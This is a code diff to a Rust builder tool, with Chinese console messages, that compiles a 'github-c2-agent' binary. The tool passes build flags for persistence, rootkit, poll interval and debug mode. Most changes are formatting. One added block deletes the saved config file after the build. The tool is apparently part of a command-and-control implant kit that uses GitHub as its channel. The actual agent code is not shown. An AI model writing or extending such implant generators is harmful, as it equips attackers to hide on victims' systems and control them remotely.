@@ -1,7 +1,7 @@
-use std::process::Command;
-use std::io::{self, Write};
-use serde::{Serialize, Deserialize};
+use serde::{Deserialize, Serialize};
 use std::fs;
+use std::io::{self, Write};
+use std::process::Command;
 
 #[derive(Serialize, Deserialize, Default)]
 struct Config {
@@ -122,13 +122,19 @@ fn main() {
 
     let _ = fs::write(config_path, serde_json::to_string_pretty(&config).unwrap());
     generate_agent(&config);
+
+    if fs::metadata(config_path).is_ok() {
+        let _ = fs::remove_file(config_path);
+    }
 }
 
 fn generate_agent(config: &Config) {
     println!("\n开始编译...\n");
 
     let agent_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
-        .parent().unwrap().join("agent");
+        .parent()
+        .unwrap()
+        .join("agent");
 
     let output = Command::new("cargo")
         .current_dir(&agent_dir)
@@ -139,15 +145,25 @@ fn generate_agent(config: &Config) {
         .env("POLL_INTERVAL", &config.poll_interval)
         .env("TIME_WINDOW", &config.time_window)
         .env("ENABLE_DEBUG", if config.enable_debug { "1" } else { "0" })
-        .env("ENABLE_PERSISTENCE", if config.enable_persistence { "1" } else { "0" })
-        .env("ENABLE_ROOTKIT", if config.enable_rootkit { "1" } else { "0" })
+        .env(
+            "ENABLE_PERSISTENCE",
+            if config.enable_persistence { "1" } else { "0" },
+        )
+        .env(
+            "ENABLE_ROOTKIT",
+            if config.enable_rootkit { "1" } else { "0" },
+        )
         .arg("build")
         .arg("--release")
         .output();
 
     match output {
         Ok(o) if o.status.success() => {
-            let exe_name = if cfg!(windows) { "github-c2-agent.exe" } else { "github-c2-agent" };
+            let exe_name = if cfg!(windows) {
+                "github-c2-agent.exe"
+            } else {
+                "github-c2-agent"
+            };
             let exe_path = agent_dir.join(format!("target/release/{}", exe_name));
             println!("\n✅ 编译成功: {}", exe_path.display());
         }
